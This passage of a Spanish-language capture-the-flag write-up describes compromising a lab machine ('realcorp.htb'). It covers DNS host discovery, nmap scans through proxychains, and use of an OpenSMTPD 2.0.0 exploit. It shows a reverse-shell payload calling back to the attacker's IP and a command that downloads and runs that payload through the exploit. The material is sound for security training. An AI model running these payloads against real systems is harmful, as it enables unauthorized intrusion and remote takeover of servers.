<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">nslookup</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.241</span><span style="color:#B56959;--shiki-dark:#C3E88D">.251.X</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224</span></span></code></pre> 
<p>Si el código de salida no es cero, el host no existe.</p>
<p>Podemos implementar esto con un script bash:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">DNS_SERVER</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.10.224</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">IP_RANGE</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.241.251</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">for</span><span style="color:#B07D48;--shiki-dark:#BABED8"> HOST</span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic"> in</span><span style="color:#999999;--shiki-dark:#89DDFF"> $(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">seq</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 254</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic"> do</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">   IP</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$IP_RANGE</span><span style="color:#B56959;--shiki-dark:#C3E88D">.</span><span style="color:#B56959;--shiki-dark:#BABED8">$HOST</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   nslookup</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$IP</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $DNS_SERVER</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> 1&gt;&amp;2&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D">/dev/null</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Try to resolve IP to a hostname</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">   if</span><span style="color:#999999;--shiki-dark:#89DDFF"> [[</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> $?</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> -eq</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0</span><span style="color:#999999;--shiki-dark:#89DDFF"> ]];</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # If nslookup exited with 0, the query was successful = host found</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">    then</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">       echo</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">Host (</span><span style="color:#B56959;--shiki-dark:#BABED8">$IP</span><span style="color:#B56959;--shiki-dark:#C3E88D">) found via DNS:</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">       nslookup</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$IP</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $DNS_SERVER</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Print info</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">    fi</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic"> done</span></span></code></pre> 
<p>Ejecutemos el script y veamos si se puede encontrar algún host.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">./dns-scan.sh</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Host</span><span style="color:#393A34;--shiki-dark:#BABED8"> (10.241.251.113) found via DNS:</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">113.251.241.10.in-addr.arpa</span><span style="color:#B56959;--shiki-dark:#C3E88D">     name</span><span style="color:#B56959;--shiki-dark:#C3E88D"> =</span><span style="color:#B56959;--shiki-dark:#C3E88D"> srvpod01.realcorp.htb.</span></span></code></pre> 
<p>Encontramos con éxito un host: 10.241.251.113 (srvpod01.realcorp.htb). Usemos nmap para encontrar cualquier puerto abierto.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">proxychains</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -q</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sT</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -Pn</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -n</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -v</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.241</span><span style="color:#B56959;--shiki-dark:#C3E88D">.251.113</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Discovered</span><span style="color:#B56959;--shiki-dark:#C3E88D"> open</span><span style="color:#B56959;--shiki-dark:#C3E88D"> port</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 25</span><span style="color:#B56959;--shiki-dark:#C3E88D">/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D"> on</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.241</span><span style="color:#B56959;--shiki-dark:#C3E88D">.251.113</span></span></code></pre> 
<p>Parece que el puerto 25 (SMTP) está abierto en el host.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">proxychains</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -q</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sT</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -Pn</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -n</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sC</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sV</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -p</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 25</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.241</span><span style="color:#B56959;--shiki-dark:#C3E88D">.251.113</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Nmap</span><span style="color:#B56959;--shiki-dark:#C3E88D"> scan</span><span style="color:#B56959;--shiki-dark:#C3E88D"> report</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.241</span><span style="color:#B56959;--shiki-dark:#C3E88D">.251.113</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Host</span><span style="color:#B56959;--shiki-dark:#C3E88D"> is</span><span style="color:#B56959;--shiki-dark:#C3E88D"> up</span><span style="color:#393A34;--shiki-dark:#BABED8"> (0.19s </span><span style="color:#B56959;--shiki-dark:#C3E88D">latency</span><span style="color:#393A34;--shiki-dark:#BABED8">).</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">PORT</span><span style="color:#B56959;--shiki-dark:#C3E88D">   STATE</span><span style="color:#B56959;--shiki-dark:#C3E88D"> SERVICE</span><span style="color:#B56959;--shiki-dark:#C3E88D"> VERSION</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">25/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D"> open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  smtp</span><span style="color:#B56959;--shiki-dark:#C3E88D">    OpenSMTPD</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> smtp-commands:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> smtp.realcorp.htb</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Hello</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap.scanme.org</span><span style="color:#393A34;--shiki-dark:#BABED8"> [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, </span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">_</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0</span><span style="color:#B56959;--shiki-dark:#C3E88D"> This</span><span style="color:#B56959;--shiki-dark:#C3E88D"> is</span><span style="color:#B56959;--shiki-dark:#C3E88D"> OpenSMTPD</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0</span><span style="color:#B56959;--shiki-dark:#C3E88D"> To</span><span style="color:#B56959;--shiki-dark:#C3E88D"> report</span><span style="color:#B56959;--shiki-dark:#C3E88D"> bugs</span><span style="color:#B56959;--shiki-dark:#C3E88D"> in</span><span style="color:#B56959;--shiki-dark:#C3E88D"> the</span><span style="color:#B56959;--shiki-dark:#C3E88D"> implementation,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> please</span><span style="color:#B56959;--shiki-dark:#C3E88D"> contact</span><span style="color:#B56959;--shiki-dark:#C3E88D"> bugs@openbsd.org</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0</span><span style="color:#B56959;--shiki-dark:#C3E88D"> with</span><span style="color:#B56959;--shiki-dark:#C3E88D"> full</span><span style="color:#B56959;--shiki-dark:#C3E88D"> details</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0</span><span style="color:#B56959;--shiki-dark:#C3E88D"> End</span><span style="color:#B56959;--shiki-dark:#C3E88D"> of</span><span style="color:#B56959;--shiki-dark:#C3E88D"> HELP</span><span style="color:#B56959;--shiki-dark:#C3E88D"> info</span></span></code></pre> 
<p>Parece que el nombre de host del servidor es smtp.realcorp.htb y está ejecutando OpenSMTPD (Versión 2.0.0). Agreguemos el host a nuestro archivo /etc/hosts:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">sudo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nano</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /etc/hosts</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">10.10.10.224</span><span style="color:#B56959;--shiki-dark:#C3E88D">    srv01.realcorp.htb</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">10.197.243.31</span><span style="color:#B56959;--shiki-dark:#C3E88D">   wpad.realcorp.htb</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">10.197.243.77</span><span style="color:#B56959;--shiki-dark:#C3E88D">   ns.realcorp.htb</span><span style="color:#B56959;--shiki-dark:#C3E88D"> proxy.realcorp.htb</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">10.241.251.113</span><span style="color:#B56959;--shiki-dark:#C3E88D">  smtp.realcorp.htb</span></span></code></pre> 
<p>busquemos un exploit para OpenSMTPD v2.0.0.</p>
<h1 id="explotation">Explotation</h1>
<p>Buscando en google encontramos un exploit: <a href="https://www.exploit-db.com/exploits/47984">https://www.exploit-db.com/exploits/47984</a></p>
<p>Vamos a enviarnos una revshell:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">nc</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -nlvp</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1234</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">echo</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.11/1234 0&gt;&amp;1&quot;</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /var/www/html/index.html</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">sudo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> service</span><span style="color:#B56959;--shiki-dark:#C3E88D"> apache2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> start</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">proxychains</span><span style="color:#B56959;--shiki-dark:#C3E88D"> python3</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 47984</span><span style="color:#B56959;--shiki-dark:#C3E88D">.py</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.241</span><span style="color:#B56959;--shiki-dark:#C3E88D">.251.113</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 25</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">wget 10.10.14.11;bash index.html</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span></span></code></pre> 
<p>Ya tenenos la shell.</p>
<h1 id="lateral-movement">Lateral Movement</h1>
<p>Comencemos enumerando todos los usuarios de la máquina:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">root@smtp:/home#</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ls</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -alh</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">total</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0</span></span>
